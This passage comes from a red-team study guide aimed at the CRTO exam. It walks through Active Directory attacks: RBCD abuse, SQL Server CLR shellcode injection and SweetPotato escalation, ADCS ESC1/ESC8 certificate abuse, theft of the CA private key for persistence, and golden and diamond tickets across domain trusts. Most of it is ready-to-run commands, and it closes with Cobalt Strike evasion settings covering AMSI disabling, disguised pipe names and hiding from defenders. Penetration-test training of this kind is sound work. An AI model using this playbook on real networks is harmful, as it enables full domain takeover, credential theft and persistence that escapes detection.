Tell the target "this machine account is allowed to delegate to you":

```powershell
Set-ADComputer lon-fs-1 -PrincipalsAllowedToDelegateToAccount @('your-machine$')
```

This writes the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on `lon-fs-1`. Now it thinks our machine is trusted to delegate to it.

### Step 3 - Perform S4U from Your Controlled Machine

Now do S4U2self + S4U2proxy from our machine account to get a service ticket as Administrator:

```
Rubeus.exe s4u /user:your-machine$ /rc4:<your machine hash> /msdsspn:cifs/lon-fs-1 /impersonateuser:Administrator /ptt
```

Out comes a service ticket for `cifs/lon-fs-1` as Administrator. RBCD did the heavy lifting.

### Step 4 - Access the Target

```
ls \\lon-fs-1\c$
```

Full admin access to the file server.

### Cleanup

Always clean up after yourself. Remove the RBCD config so defenders don't spot it:

```powershell
Set-ADComputer lon-fs-1 -PrincipalsAllowedToDelegateToAccount $null
```

### RBCD

**Classic constrained delegation needs a domain admin to set up. RBCD just needs WriteProperty on the target's AD object. Misconfigured ACLs are everywhere. A helpdesk group with WriteProperty on servers? That's a full compromise path through RBCD**.

### When PowerView Breaks: Inline ADSI

Sometimes `compress.ps1` (the obfuscated PowerView loader) won't load. That means no `Set-ADComputer`, no `Get-DomainComputer`. But you can still write the RBCD attribute using raw ADSI from PowerShell:

```powershell
$rsd = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-...-<FAKE-COMPUTER-RID>)"
$rsdb = New-Object byte[] ($rsd.BinaryLength)
$rsd.GetBinaryForm($rsdb, 0)
$target = [ADSI]"LDAP://CN=TARGET-SRV,CN=Computers,DC=domain,DC=com"
$target.Put("msDS-AllowedToActOnBehalfOfOtherIdentity", $rsdb)
$target.SetInfo()
```

Pure .NET, no modules needed. Even works in Constrained Language Mode because `[ADSI]` type accelerators are allowed.

### Writing the Objective Without Spawning a Beacon

Sometimes you just need to prove you can access a target but don't want to spawn another beacon on it. More beacons = more detection surface. Instead, write a file over UNC from your existing beacon:

```
shell echo Sand > \\target-srv\C$\flag.txt
```

No lateral movement, no new process on the target. The write goes over SMB using whatever token your current beacon holds. Proof of access.

## 15. SQL Server Attacks - From Database to OS Compromise

You've tried Kerberos delegation, RBCD, lateral movement, and you're stuck. Then you notice SQL Servers in the domain. SQL Servers in AD almost always run as domain service accounts. And they're often linked to other SQL Servers. If you can run queries on one, you can potentially hop to others and get OS-level code execution. It's a whole separate attack path most people forget about.

### Step 1 - Find SQL Servers

First find them. LDAP query for machines with MSSQLSvc SPNs:

```
ldapsearch (servicePrincipalName=MSSQLSvc*) cn,servicePrincipalName
```

### Step 2 - Enumerate via SQL-BOF

SQL-BOF is a Beacon Object File for SQL stuff. No .NET assembly touching disk, pure in-memory BOF. Way more OPSEC safe than loading sqlclient:

```
sql-info lon-sql-1
sql-whoami lon-sql-1
sql-query lon-sql-1 "SELECT name FROM master.dbo.sysdatabases"
```

`sql-info` tells you the server version and config. `sql-whoami` tells you what SQL login you're running as and what roles you have. If you see sysadmin role, you're golden.

### Step 3 - Enable CLR and Execute Code

If you have sysadmin, enable CLR (Common Language Runtime). CLR lets SQL Server run .NET code. We use that to inject Beacon shellcode:

```
sql-enableclr lon-sql-1
sql-clr lon-sql-1 C:\Payloads\sql_clr.dll
```

The CLR assembly is a C# DLL that does classic shellcode injection:

1. `VirtualAlloc` → allocate executable memory
2. Copy Beacon shellcode into the allocation
3. `CreateThread` → execute the shellcode

**Now you have a Beacon running on the SQL server as whatever service account SQL is running under**.

### Step 4 - Explore SQL Links

SQL servers talk to each other through links. One SQL server can forward queries to another. This is huge because if you own one, you might be able to hop to others:

```
sql-links lon-sql-1
sql-checkrpc lon-sql-1
sql-enablerpc lon-sql-1 LON-SQL-2
```

If RPC is enabled on the link, you can run stored procedures on the remote SQL server. That includes `xp_cmdshell` or CLR assemblies. Same attack, different server, through the link.

### Step 5 - Privilege Escalation with SweetPotato

SQL service accounts almost always have `SeImpersonatePrivilege`. That's the magic privilege for potato attacks:

```
execute-assembly C:\Tools\SweetPotato\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc <base64 beacon>"
```

SweetPotato **abuses that privilege to go from service account to SYSTEM. Full SYSTEM on that box**.

### The SQL Attack Chain

```
Find SQL Servers (LDAP)
  → Enumerate (sql-info, sql-whoami)
    → Enable CLR → Execute Beacon on SQL
      → Hop via SQL Links to other SQL servers
        → SweetPotato to SYSTEM
```

SQL servers are the path nobody checks. While defenders focus on workstations and DCs, SQL servers sit there with sysadmin access, linked to each other, running as domain accounts. It's a parallel highway to domain compromise.

## 16. ADCS Attacks - Abusing Active Directory Certificate Services

**Kerberos delegation paths exhausted, SQL is a dead end, and you still don't have DA. Check if the domain has ADCS (Active Directory Certificate Services). ADCS issues certificates for authentication. If a certificate template is misconfigured, you can request a certificate as any user, including domain admins. Certificate-based attacks are powerful because certs last way longer than passwords and don't get reset on password change**.

### ESC1 - Vulnerable Certificate Template

**ESC1 vs ESC8: use ESC1 when you find a vulnerable certificate template (you can directly request a cert). Use ESC8 when templates are locked down but the CA has an HTTP enrollment endpoint and you can relay NTLM auth to it. ESC1 is simpler. ESC8 needs relay setup but works even with hardened templates. Three things make a template vulnerable for ESC1:**

- Enrollee supplies the Subject Alternative Name (SAN) = we choose WHO the cert is for
- Low-privileged users can enroll
- Template is used for client authentication

#### Step 1 - Find Vulnerable Templates

```
execute-assembly C:\Tools\Certify\Certify.exe find /vulnerable
```

Look for templates where `msPKI-Certificate-Name-Flag` includes `ENROLLEE_SUPPLIES_SUBJECT`. That flag is the golden ticket. It means you pick who the cert is for.

#### Step 2 - Request a Certificate as Administrator

```
execute-assembly C:\Tools\Certify\Certify.exe request /ca:lon-dc-1\CA /template:VulnTemplate /altname:Administrator
```

`/altname:Administrator` is the key part. We're telling the CA "issue this cert for Administrator." The CA doesn't question it because the template allows enrollee-supplied subjects. It just hands us the cert.

#### Step 3 - Convert and Use

Convert the PEM cert to PFX format, then feed it to Rubeus to get a TGT:

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgt /user:Administrator /certificate:<base64 pfx> /password:password /ptt
```

You now have a TGT as Administrator. One misconfigured template flag turned into full domain admin.

---

### ESC8 - NTLM Relay to HTTP Enrollment

**ESC8 is the relay version. When templates are locked down but the CA exposes HTTP enrollment, you relay NTLM auth to it. Three things need to line up:**

- The CA has an HTTP enrollment endpoint (no HTTPS required = no channel binding)
- We can coerce a machine to authenticate to us (spooler trick again)
- We relay that NTLM authentication to the CA's HTTP enrollment

#### Step 1 - Find Vulnerable CAs

```
execute-assembly C:\Tools\Certify\Certify.exe cas /showAllPermissions
```

Look for CAs with HTTP enrollment endpoints. If you see `/certsrv/` accessible over HTTP (not HTTPS), that's your target.

#### Step 2 - Set Up the Relay

This is the most complex setup in the whole course. You need SOCKS proxy + port forwarding + ntlmrelayx all working together:

1. Stop SMB services on a machine to free port 445:

   ```
   net stop lanmanserver /y
   ```
2. Set up reverse port forward through Beacon:

   ```
   rportfwd_local 445 127.0.0.1 445
   ```
3. Run ntlmrelayx through the SOCKS proxy:

   ```
   ntlmrelayx.py -t http://lon-dc-1/certsrv/certfnsh.asp --adcs --template DomainController
   ```

#### Step 3 - Coerce Authentication

Now force the DC to authenticate to us. Same spooler trick from Section 13:

```
execute-assembly C:\Tools\SharpSpoolTrigger\SharpSpoolTrigger.exe lon-dc-1 lon-relay-machine
```

Chain reaction: DC authenticates to us, we relay that NTLM auth to the CA's HTTP enrollment, CA issues a certificate for the DC's machine account. All automated through ntlmrelayx.

#### Step 4 - Use the Certificate

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgt /user:LON-DC-1$ /certificate:<base64 cert> /ptt
```

TGT as the domain controller machine account. From here, DCSync and dump every hash in the domain.

#### Cleanup

Always restore SMB services after. If you leave them stopped, it's a dead giveaway:

```
net start lanmanserver
net start srv2
net start srvnet
```

## 17. Domain Persistence - Stealing the CA Certificate (DPERSIST1)

Y**ou already have domain admin. ESC1 or ESC8 got you in. But you want persistence that survives password resets, account lockouts, everything. DPERSIST1 is the nuclear option. You steal the CA's private key and become your own certificate authority. From that point, you can forge a certificate for any user, any time, without ever touching the CA server again**.

### Persistence angle

The CA's private key signs every certificate in the domain. If we have it:

- Forge a certificate for ANY user (domain admin, enterprise admin, anyone)
- The forged cert is indistinguishable from a legitimate one
- It survives password resets (certs don't use passwords)
- It persists until the CA cert expires (usually 5+ years)

### Step 1 - Dump the CA Certificate and Private Key

You need admin on the CA server. From a Beacon there:

```
execute-assembly C:\Tools\Certify\Certify.exe manage-self /dump-certs
```

This dumps the CA's cert and private key as a base64-encoded PFX. Save it. This is the most valuable thing you'll steal in the entire engagement.

### Step 2 - Forge a Certificate for Any User

Now use that stolen CA cert to forge a certificate for whoever you want:

```
execute-assembly C:\Tools\Certify\Certify.exe forge /ca-cert:<base64 CA pfx> /ca-password:password /subject:CN=Administrator,CN=Users,DC=yourlab,DC=local /altname:Administrator
```

This creates a certificate that looks exactly like the CA issued it for Administrator. But we signed it ourselves with the stolen key. The domain can't tell the difference.

### Step 3 - Use the Forged Certificate

```
execute-assembly C:\Tools\Rubeus\Rubeus.exe asktgt /user:Administrator /certificate:<base64 forged pfx> /password:password /ptt
```

TGT as Administrator. Any time you want, for the next 5+ years, until they revoke the entire CA.

### Durability

- Password reset? Doesn't matter. Cert-based auth doesn't use passwords
- Account lockout? Certs bypass lockout policies
- New domain admin? Forge a cert for them too
- The only fix: **revoke and reissue the entire CA**, a massive, disruptive operation most orgs won't do

This is why ADCS compromise is considered the worst thing that can happen to an AD environment. The only real fix is revoking and reissuing the entire CA, which most organizations will never do because it breaks everything.

## 18. Domain Trust Abuse - Parent-Child, Inbound & Outbound Trusts

Y**ou own one domain but the enterprise has more. Real companies almost always have multiple domains connected by trusts. Parent-child trusts, inbound trusts, outbound trusts. Each one is a different attack path. This is how you go from owning one domain to owning the whole forest or reaching into partner domains**.

---

### A. Parent-Child Trust (Escalate to Forest Root)

Parent-child: you're domain admin in a child domain like `dev.yourlab.local` but want to reach the parent `yourlab.local`. The trust is bidirectional and within the forest (`trustAttributes: 32`). The trick is SID History in golden tickets. You forge a ticket that says you're an Enterprise Admin in the parent.

#### The Attack

1. **Get the child domain's krbtgt hash** (via DCSync on the child DC):

   ```
   mimikatz lsadump::dcsync /domain:dev.yourlab.local /user:dev\krbtgt
   ```
2. **Find the Enterprise Admins SID** in the parent domain:

   ```
   powershell Get-DomainGroup -Identity "Enterprise Admins" -Domain yourlab.local | Select objectSid
   ```

   Enterprise Admins SID = parent domain SID + `-519`
3. **Forge a golden ticket with SID History**:

   ```
   execute-assembly C:\Tools\Rubeus\Rubeus.exe golden /user:Administrator /domain:dev.yourlab.local /sid:<child SID> /sids:<EA SID> /rc4:<child krbtgt hash> /ptt
   ```

   `/sids:` is the key flag. It injects the Enterprise Admins SID into the ticket's SID History. When the parent DC sees this ticket, it thinks you're an Enterprise Admin and gives you full access.
4. **Access the parent DC**:

   ```
   ls \\lon-dc-1.yourlab.local\c$
   ```

**Child domain admin to forest-wide Enterprise Admin. One golden ticket**.

---

### B. Inbound Trust (Access Resources in Our Domain from a Trusted Domain)

Inbound trust abuse: an external domain trusts YOUR domain (`trustDirection: 1`). Users from that external domain might have been given access to stuff in your domain through Foreign Security Principals (FSPs). If you can find and compromise those external users, you can access whatever they have access to in your domain.

#### Step 1 - Find Foreign Security Principals

Find external users/groups that have been given access in your domain:

```
ldapsearch (objectClass=foreignSecurityPrincipal) cn,objectSid
```

Resolve those SIDs to find which external users have access to what.

#### Step 2 - Find What They Can Access

Check what groups they're in. FSPs usually get added to domain local groups that give access to specific resources like file shares or SQL servers.

#### Step 3 - Get the External User's Credentials

If you've compromised the external user already (like you got their AES256 hash via DCSync):

```
krb_asktgt /user:externaluser /domain:partner.local /aes256:<hash>
```

#### Step 4 - Request Cross-Trust Service Tickets

Use that TGT to get an inter-realm referral ticket, then a service ticket in your domain:

```
krb_asktgs /ticket:<TGT kirbi> /service:krbtgt/yourlab.local   (inter-realm referral)
krb_asktgs /ticket:<referral kirbi> /service:cifs/lon-fs-1.yourlab.local   (service ticket)
```

Now you can access resources in your domain as that external user. Whatever they had access to is yours.

---

### C. Outbound Trust (Enumerate the Trusted Domain)

Outbound trust abuse: WE trust an external domain (`trustDirection: 2`). Our users can access their stuff. The abuse is we can DCSync the trust's shared secret key and use it to authenticate into their domain as the trust account. From there we can enumerate everything in their environment.

#### Step 1 - Find the Trust Key

Every trust has a Trusted Domain Object (TDO) in AD. It stores the shared secret between the two domains. First get its GUID:

```
ldapsearch (objectClass=trustedDomain) cn,objectGUID
```

#### Step 2 - DCSync the Trust Key

DCSync that TDO to get the shared inter-realm key:

```
mimikatz lsadump::dcsync /guid:{<TDO GUID>}
```

Out comes the RC4 (or AES) trust key and the trust account name (like `PARTNER$`). That's your way in.

#### Step 3 - Get a TGT as the Trust Account

```
krb_asktgt /user:PARTNER$ /domain:yourlab.local /rc4:<trust key>
```

Now you have a TGT for the trust account in the partner domain. You're in their world.

#### Step 4 - Enumerate the Partner Domain

With this TGT you can enumerate everything in their domain: users, groups, computers, shares. Map their whole environment and find more attack paths.

---

### Trust Abuse Summary

| Trust Type | Direction | Key Technique | Goal |
| --- | --- | --- | --- |
| Parent-Child | Bidirectional | Golden ticket + SID History | Child → Enterprise Admin |
| Inbound | They trust us | FSP enumeration + cross-trust tickets | Access resources as external user |
| Outbound | We trust them | DCSync TDO + trust account TGT | Enumerate partner domain |

### Diamond Ticket Over Golden Ticket

Diamond vs golden: golden tickets work but EDR and MDI can flag them. The ticket is entirely forged, so the metadata doesn't match what the DC would have issued. It's a known detection signature.

Diamond ticket fixes that. It requests a real TGT from the DC, decrypts it with the `krbtgt` hash, modifies the PAC inside (adds SID history, changes group memberships), re-encrypts, and hands it back. The ticket structure is genuine DC-issued material. You just edited what's inside.

```
execute-assembly Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:512 /krbkey:<krbtgt-aes256> /nowrap
```

The `/tgtdeleg` flag uses Kerberos delegation to obtain the ticket instead of supplying a password or hash. The result is a TGT that passes inspection way better than a golden ticket.

Use diamond tickets for parent-child trust abuse too. Forge the SID history (`/sids:S-1-5-21-<parent>-519`) into a diamond ticket instead of a golden ticket. Same Enterprise Admins escalation, way less detection.

### Real TGT for Enclave Trusts (ngreen's Approach)

Why not silver tickets: silver tickets hit a wall on modern enclaves. The PAC in a silver ticket doesn't go through group expansion at the target DC. So if the service checks group membership, the ticket is dead. You authenticate but can't access anything.

ngreen's fix: get a real TGT for the trust instead. Use the shared trust key (from DCSync of the TDO) to request a genuine TGT as the trust account, then request service tickets normally. The DC performs proper group expansion on a real TGT so everything works.

Do it attacker-side with Impacket:

```bash
# Get the trust key via secretsdump
secretsdump.py -just-dc-user 'YOURDOM$' domain/admin@dc-ip

# Request a TGT as the trust account
getST.py -spn cifs/target-dc.enclave.local -impersonate Administrator -dc-ip <enclave-dc-ip> 'enclave.local/yourdom$' -hashes :<trust-ntlm>

# Use it
KRB5CCNAME=Administrator.ccache smbclient.py -k -no-pass target-dc.enclave.local
```

This works where silver tickets fail because the DC sees a real authentication flow, not a forged ticket.

---

## 19. OPSEC Discipline

### OPSEC matters

This applies to everything above. Every single technique above is useless if Defender catches you on the first action. In the CRTO exam, every detection costs points. In real engagements, one alert can burn the whole operation. The goal is zero Defender alerts, zero suspicious service creations.

### Process Injection Configuration

When to change this: before you do anything else. Default Cobalt Strike uses `CreateThread` for process injection. Every EDR on the planet flags `CreateThread` from an injected thread. If you skip this config change, your beacon dies the moment it tries to inject into another process.

```
process-inject {
    set allocator      "NtMapViewOfSection";
    set min_alloc       "16700";
    set userwx          "false";
    
    execute {
        CreateThread "ntdll!RtlUserThreadStart";
        NtQueueApcThread-s;
        SetThreadContext;
        CreateRemoteThread "kernel32!LoadLibraryA";
        RtlCreateUserThread;
    }
}
```

Switch to `NtQueueApcThread-s` and `SetThreadContext` instead of `CreateRemoteThread`. The `-s` means suspend variant, which is cleaner because the thread starts suspended, gets the payload queued, then resumes. Less noise. Test this in your detection harness before the exam or engagement.

### Named Pipe Hardening

When to change this: same as above, before anything else. Default Cobalt Strike pipe names (`msagent_*`, `postex_*`, `status_*`) are signatured by every security product. If a defender sees `msagent_` on the wire, they know exactly what's running. Change these or you're caught straightaway.

In your C2 profile, change the pipe names to something that blends in. Use `dotnet-diagnostic-####` format because that's what real .NET diagnostics look like on a Windows box:

```
post-ex {
    set pipename         "dotnet-diagnostic-####";
    set spawnto_x64      "%windir%\\Microsoft.NET\\Framework64\\v4.0.30319\\ngentask.exe";
    set amsi_disable     "true";
}
```

And in `ak-settings` within `stage`, do the same thing:

```
stage {
    ...
    set pipename         "dotnet-diagnostic-####";
    set pipename_stager  "dotnet-diagnostic-####";
}
```

The `####` gets replaced with random numbers at runtime, so each beacon gets a unique pipe name that looks like normal .NET diagnostic traffic. Two places to change: `post-ex { set pipename }` controls what `execute-assembly` and BOFs use for their pipes, and `ak-settings` in the Artifact Kit stage block controls the main beacon pipe.

### Sleep and Jitter

When to change sleep: depends on what you're doing. Never run `sleep 0` (interactive mode) unless you absolutely need real-time response. Sleep 0 means the beacon calls home constantly, which is the loudest thing you can do. Defenders spot constant beaconing instantly.

```
sleep 30 20
```

Default for most of the engagement: 30 seconds with 20% jitter (so it actually checks in somewhere between 24-36 seconds, looks more like normal traffic). Drop to `sleep 5` or `sleep 1` only when you're actively running commands and need quick responses, like during lateral movement or ticket operations. When you're done with the fast stuff, set it back to 30. Forgetting to reset sleep is how people get caught.

### Tool Discipline

Tool choices matter. Some commands get you caught immediately. **Banned** (use these and you will get caught):

- `execute-assembly ADSearch.exe`, use `ldapsearch` BOF instead
- In-process mimikatz with `!` modifier (e.g. `!mimikatz ...`), runs in the beacon process, if it crashes you lose the beacon
- `psexec` / `psexec_psh`, creates a service, leaves artifacts
- LSASS memory dumps, instant Defender alert
- Kerberoasting from the target, noisy, do it attacker-side
- Disabling or tampering with Defender, Defender flags it instantly

**Safe alternatives** (use these instead, they do the same job without the detection):

- `ldapsearch` BOF for AD queries (BOFHound-compatible)
- `mimikatz` (without `!`) in a sacrificial process
- `scshell` for lateral movement (modifies existing service binary path, no new service)
- Rubeus for ticket operations (run from beacon)
- `secretsdump.py` through SOCKS for DCSync (attacker-side, no beacon on DC)
- `getST.py` through SOCKS for S4U operations
- `ticketer.py` for forging tickets attacker-side

### One Command Per Line

When to remember this: every single time you type a beacon command. Never chain commands with `&&` or `;` in a beacon. Each command in beacon runs as a separate job. If you chain them, the first one might fail silently and the second one runs in a weird state, or the whole thing errors out and you've wasted time and generated noise for nothing. One command. Wait for output. Then the next one.

### Detection Harness Method

Detection harness: before the exam, before every engagement, every time. Set up a lab VM with Defender on, snapshot it, then test every single action you plan to use:

1. Take a snapshot of the target VM
2. Run one action (e.g. `execute-assembly Rubeus.exe triage`)
3. Check Defender alerts and event logs
4. If `delta = 0` (no new alerts), the action is safe
5. If `delta > 0`, modify your approach until it is clean
6. Revert to snapshot, test the next action

Keep a detection ledger as you test: what you did, what happened, safe or not. Bring this list into the exam. If something flagged in the lab, it will flag in the exam. No exceptions.

### createnetonly for Ticket Conflicts

createnetonly pattern: whenever you're working with multiple Kerberos tickets for different targets. When you `kerberos_ticket_use` a ticket, it loads into your current logon session. Problem is, if you then need a different ticket for a different machine or domain, the tickets clash. Wrong service, wrong domain, authentication fails and you're stuck wondering why.

Fix: use `make_token` with fake credentials first. This creates a brand new logon session. Then apply your ticket into that clean session. Each target gets its own isolated session:

```
make_token DEV\yourfakeuser FakePass123
kerberos_ticket_use /path/to/ticket.kirbi
```

The fake credentials will fail NTLM auth, but that's fine because you're using Kerberos tickets anyway. The point is the new logon session isolates your ticket from everything else. Each target gets its own `make_token` + `kerberos_ticket_use` pair. No conflicts, no weird auth failures.

### Attacker-Side Tooling via SOCKS

Attacker-side tooling: whenever you can. Running tools through a SOCKS proxy from your own machine is way safer than running them on the target through beacon. No execute-assembly, no .NET runtime loading, no process injection on the target. Set up the proxy:

```
socks 1080
```

Configure Proxifier (Windows) or proxychains (Linux) to route through `127.0.0.1:1080`. Now you can run Impacket tools, BloodHound collectors, whatever you want from your own box, and it tunnels through the beacon:

```bash
# DCSync without a beacon on the DC
secretsdump.py -just-dc-user krbtgt domain/admin@dc-ip

# S4U from attacker side
getST.py -spn mssql/target.domain.com -impersonate Administrator domain/machine$ -hashes :hash

# Forge tickets locally
ticketer.py -nthash <krbtgt-hash> -domain domain.com -domain-sid S-1-5-21-... -extra-sid S-1-5-21-...-519 Administrator

# Access shares
KRB5CCNAME=ticket.ccache smbclient.py -k -no-pass target.domain.com
```

The advantage: no `execute-assembly` on the target means no .NET runtime loaded on the target, no process injection. The traffic coming out of the compromised host looks like normal Kerberos and SMB, not a suspicious child process spawning tools. Use SOCKS for secretsdump, getST, ticketer, smbclient, anything Impacket. Use beacon's built-in commands only when you have to.
